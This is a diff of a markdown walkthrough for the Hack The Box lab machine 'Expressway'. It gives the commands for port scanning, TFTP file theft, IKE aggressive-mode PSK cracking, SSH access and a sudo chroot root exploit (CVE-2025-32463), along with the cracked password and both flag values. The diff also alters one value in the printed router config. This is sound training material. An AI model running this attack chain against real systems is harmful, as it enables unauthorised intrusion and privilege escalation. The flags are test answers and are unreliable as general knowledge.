@@ -1,5 +1,46 @@
+
+
+# #HTB 
+
+
 ![[Pasted image 20260130204456.png]]
 
+
+# HTB: Expressway
+
+**Machine IP:** `10.129.238.52`  
+**Difficulty:** Easy 
+**OS:** Linux (Debian)
+
+---
+
+## Tools Used
+- `nmap` - TCP/UDP port scanning
+- `Metasploit` - TFTP file enumeration
+- `tftp` - File download client
+- `ike-scan` - IKE aggressive mode hash capture
+- `psk-crack` - PSK hash cracking
+- `ssh` - Remote access
+- `gcc` - Exploit compilation
+
+---
+
+
+## Step 1: Reconnaissance - Port Scanning
+
+### TCP Scan Results
+
+```
+sudo nmap 10.129.238.52 -sV
+```
+
+**Result:**
+```
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+```
+
+Only SSH was initially discovered. OpenSSH 10.0p2 is the latest version (released April 2025) with no known severe vulnerabilities.
 
 ![[Pasted image 20260130205059.png]]
 
@@ -7,454 +48,299 @@
 Based on this information, when I tried to dig more in hopes of finding a vulnerability, I came to know that this is the latest version of OpenSSH (released in April 2025) and has so far not recorded any severe vulnerabilities.
 
 
-scan UDP ports 
+### UDP Scan
+
+Since TCP revealed only SSH, a UDP scan was performed to discover additional services.
 
 ![[Pasted image 20260130205546.png]]
 
+- **Discovery:** TFTP (UDP port 69) was open.
 
 
-Using Metasploit Tool
+
+## tep 2: TFTP Enumeration
+
+### Metasploit TFTP Brute Force
+
+Using Metasploit's `auxiliary/scanner/tftp/tftpbbrute` module:
+
+```
+msf6 > use auxiliary/scanner/tftp/tftpbbrute
+msf6 > set RHOSTS 10.129.238.52
+msf6 > run
+```
 
 ![[Pasted image 20260130205721.png]]
 
+
+**Files discovered:**
+- `ciscortr.cfg` 
+- `code.img`   
+- `device.cfg` 
+- `POS3-07-5-00.sb2` 
+
 ![[Pasted image 20260130205740.png]]
 
-I connected to the TFTP server and downloaded the `ciscortr.cfg` file.
+### Download Configuration File
+
+```
+tftp 10.129.238.52
+tftp> get ciscortr.cfg
+tftp> quit
+```
 
 ![[Pasted image 20260130210427.png]]
 
 
+**Downloaded files:**
+```
+ciscortr.cfg  code.img  device.cfg  POS3-07-5-00.sb2
+```
 
 ![[Pasted image 20260130210514.png]]
 
+
+
+
+
+## Step 3: Cisco Configuration Analysis
+
+### Extracting VPN Credentials
+
+The `ciscortr.cfg` file contains a Cisco router configuration with VPN settings.
+
+**Key finding:**
 ```
 
 version 12.3
-
 no service pad
-
 service timestamps debug datetime msec
-
 service timestamps log datetime msec
-
 no service password-encryption
-
 !
-
 hostname expressway
-
 !
-
 boot-start-marker
-
 boot-end-marker
-
 !
-
 enable password *****
-
 !
-
 username ike password *****
-
 ip subnet-zero
-
 ip cef
-
 !
-
 vpdn enable
-
         vpdn-group 1
-
         request-dialin
-
         protocol pppoe
-
-
-
 !
-
 ip dhcp excluded-address 10.0.1.1 10.0.1.10
-
 ip dhcp excluded-address 10.0.2.1 10.0.2.10
-
 ip dhcp excluded-address 10.0.3.1 10.0.3.10
-
 !
-
 ip dhcp pool vlan1
-
    network 10.0.1.0 255.255.255.0
-
    default-router 10.0.1.1 
-
 !
-
 ip dhcp pool vlan2
-
    network 10.0.2.0 255.255.255.0
-
    default-router 10.0.2.1 
-
 !
-
 ip dhcp pool vlan3
-
    network 10.0.3.0 255.255.255.0
-
    default-router 10.0.3.1 
-
 !
-
 ip ips po max-events 100
-
 no ftp-server write-enable
-
 !
-
 bridge irb
-
 !
-
 interface FastEthernet0
-
         no ip address
-
 !
-
 interface FastEthernet1
-
         no ip address
-
 !
-
 interface FastEthernet2
-
         no ip address
-
 !
-
 interface FastEthernet3
-
         switchport mode trunk
-
         no ip address
-
 !
-
 interface FastEthernet4
-
         ip address 192.168.68.1 255.255.255.0
-
         no ip directed-broadcast (default)
-
         speed auto
-
         ip nat outside
-
         ip access-group 103 in
-
         no cdp enable
-
         crypto ipsec client ezvpn ezvpnclient outside
-
         crypto map static-map
-
 !
-
 crypto isakmp policy 1
-
         encryption 3des
-
         authentication pre-share
-
         group 2
-
         lifetime 480
-
 !
-
 crypto isakmp client configuration group rtr-remote
-
         key secret-password
-
         dns 208.67.222.222
-
         domain expressway.htb
-
         pool dynpool
-
 !
-
 crypto ipsec transform-set vpn1 esp-3des esp-md5
-
 !
-
 crypto ipsec security-association lifetime seconds 86400
-
 !
-
 crypto dynamic-map dynmap 1
-
         set transform-set vpn1
-
         reverse-route
-
 !
-
 crypto map static-map 1 ipsec-isakmp dynamic dynmap
-
 crypto map dynmap isakmp authorization list rtr-remote
-
 crypto map dynmap client configuration address respond
-
 crypto ipsec client ezvpn ezvpnclient
-
         connect auto
-
         group 2 key secret-password
-
         mode client
-
         peer 192.168.100.1
-
 !
-
 interface Dot11Radio0
-
         no ip address
-
         !
-
         broadcast-key vlan 1 change 45
-
         !
-
         encryption vlan 1 mode ciphers tkip 
-
         !
-
         ssid cisco
-
                 vlan 1
-
                 authentication open 
-
                 authentication network-eap eap_methods 
-
                 authentication key-management wpa optional
-
         !
-
         ssid ciscowep
-
                 vlan 2
-
                 authentication open 
-
                 !
-
         ssid ciscowpa
-
                 vlan 3
-
                 authentication open 
-
         !
-
         speed basic-1.0 basic-2.0 basic-5.5 6.0 9.0 basic-11.0 12.0 18.0 24.0 36.0 48.0 54.0
-
-        rts threshold 2312
+        rts threshold 231
 
         power local cck 50
-
         power local ofdm 30
-
         channel 2462
-
         station-role root
-
 !
-
 interface Dot11Radio0.1
-
         description Cisco Open
-
         encapsulation dot1Q 1 native
-
         no cdp enable
-
         bridge-group 1
-
         bridge-group 1 subscriber-loop-control
-
         bridge-group 1 spanning-disabled
-
         bridge-group 1 block-unknown-source
-
         no bridge-group 1 source-learning
-
         no bridge-group 1 unicast-flooding
-
 !
-
 interface Dot11Radio0.2
-
         encapsulation dot1Q 2
-
         bridge-group 2
-
         bridge-group 2 subscriber-loop-control
-
         bridge-group 2 spanning-disabled
-
         bridge-group 2 block-unknown-source
-
         no bridge-group 2 source-learning
-
         no bridge-group 2 unicast-flooding
-
 !
-
 interface Dot11Radio0.3
-
         encapsulation dot1Q 3
-
         bridge-group 3
-
         bridge-group 3 subscriber-loop-control
-
         bridge-group 3 spanning-disabled
-
         bridge-group 3 block-unknown-source
-
         no bridge-group 3 source-learning
-
         no bridge-group 3 unicast-flooding
-
 !
-
 interface Vlan1
-
         no ip address
-
         no ip directed-broadcast (default)
-
         ip nat inside
-
         crypto ipsec client ezvpn ezvpnclient inside
-
         ip inspect firewall in
-
         no cdp enable
-
         bridge-group 1
-
         bridge-group 1 spanning-disabled
-
 !
-
 interface Vlan2
-
         no ip address
-
         bridge-group 2
-
         bridge-group 2 spanning-disabled
-
 !
-
 interface Vlan3
-
         no ip address
-
         bridge-group 3
-
         bridge-group 3 spanning-disabled
-
 !
-
 interface BVI1
-
         ip address 10.0.1.1 255.255.255.0
-
 !
-
 interface BVI2
-
         ip address 10.0.2.1 255.255.255.0
-
 !
-
 ip classless
-
 !
-
 ip http server
-
 no ip http secure-server
-
 !
-
 control-plane
-
 !
-
 bridge 1 route ip
-
 bridge 2 route ip
-
 bridge 3 route ip
-
 !
-
 ip inspect name firewall tcp
-
 ip inspect name firewall udp
-
 !
-
 access-list 103 permit udp host 200.1.1.1 any eq isakmp
-
 access-list 103 permit udp host 200.1.1.1 eq isakmp any
-
 no cdp run
-
 !
-
 line con 0
-
         password *****
-
         no modem enable
-
         transport preferred all
-
         transport output all
-
 line aux 0
-
         transport preferred all
-
         transport output all
-
 line vty 0 4
-
         password *****
-
         transport preferred all
-
         transport input all
-
         transport output all
-
 
 
 ```
-
+ 
 ![[Pasted image 20260130210750.png]]
+- **Group ID:** `rtr-remote`
+- **Pre-shared Key:** `secret-password`
 
+
+
+
+
+## Step 4: IKE Aggressive Mode Attack (CVE-2018-5389)
+
+### Vulnerability Background
+
+[CVE-2018-5389](https://nvd.nist.gov/vuln/detail/CVE-2018-5389) affects IKE Aggressive Mode when Pre-shared Keys are used, allowing hash capture and offline cracking.
+
+### Capture PSK Hash
 
 There is a [known vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2018-5389) in the **IKE Aggressive mode**, where we can exploit it to get the hash of the password _(if Pre-shared Keys are used)_ required to authenticate to the VPN.
 
@@ -481,17 +367,49 @@ psk-crack -d /home/thunder/wordlist/rockyou.txt hash.txt
 
 ![[Pasted image 20260130211019.png]]
 
+**Password:** `freakingrockstarontheroad`
 
 ![[Pasted image 20260130211259.png]]
 
+
+
+
+
+## Step 5: SSH Access as ike
+
+### Login Credentials
+
+From the IKE exchange, the username was revealed as `ike@expressway.htb` (local username: `ike`).
 ![[Pasted image 20260130211358.png]]
 
+### User Flag
+
+```
+ike@expressway:~$ cat user.txt
+8aee58ec551c1b04a6388621ab74b64c
+```
 
 ![[Pasted image 20260130211422.png]]
 
 
+
+
+
+
+## Step 6: Privilege Escalation - Sudo Version
+
+### Check Sudo Version
+
 ![[Pasted image 20260130211634.png]]
 
+### Vulnerability: CVE-2025-32463
+
+This version is vulnerable to a local privilege escalation via the `--chroot` (`-R`) option.
+
+**Exploit details:**
+- **Affected versions:** Sudo 1.9.14 to 1.9.17
+- **Attack vector:** Trick sudo into loading an arbitrary shared library via crafted `/etc/nsswitch.conf`
+- **Impact:** Arbitrary command execution as root
 
 I used the `sudo` version to look for any CVEs related to it and BINGO! I found one! This is `[CVE-2025–32463](https://www.exploit-db.com/exploits/52352)`**.** This was my way in. I did​ not put any effort in understanding the CVE, but the gist is it tricks sudo to load a configuration file from a directory I control. I just copied the Proof of Concept code, pasted and labeled it as `exp.sh` in the target system.
 
@@ -598,10 +516,61 @@ rm -rf "$STAGE"
 ```
 
 
+
+
+
+
+## Step 7: Root Exploitation
+
+### Create Exploit Script
+
+On the target as `ike`, create `exp.sh`:
+
 ![[Pasted image 20260130211845.png]]
 
+
+### Root Shell
 
 ![[Pasted image 20260130212012.png]]
 
 
+
+
+
+## Step 8: Machine Owned
+
 ![[Pasted image 20260130212041.png]]
+
+
+
+## Flags
+
+|Flag|Value|
+|---|---|
+|User|`8aee58ec551c1b04a6388621ab74b64c`|
+|Root|`c7be1c893dc44515c8b73159417738fa`|
+
+---
+
+## Attack Chain Summary
+```
+TCP/UDP Port Scan
+       ↓
+TFTP Discovery (UDP 69)
+       ↓
+Download Cisco Config (ciscortr.cfg)
+       ↓
+Extract Group ID & Domain (rtr-remote / expressway.htb)
+       ↓
+IKE Aggressive Mode Attack (CVE-2018-5389)
+       ↓
+Capture & Crack PSK Hash → "freakingrockstarontheroad"
+       ↓
+SSH as ike
+       ↓
+Sudo Version Check (1.9.17 → CVE-2025-32463)
+       ↓
+Chroot Privilege Escalation Exploit
+       ↓
+Root Shell → Root Flag
+```
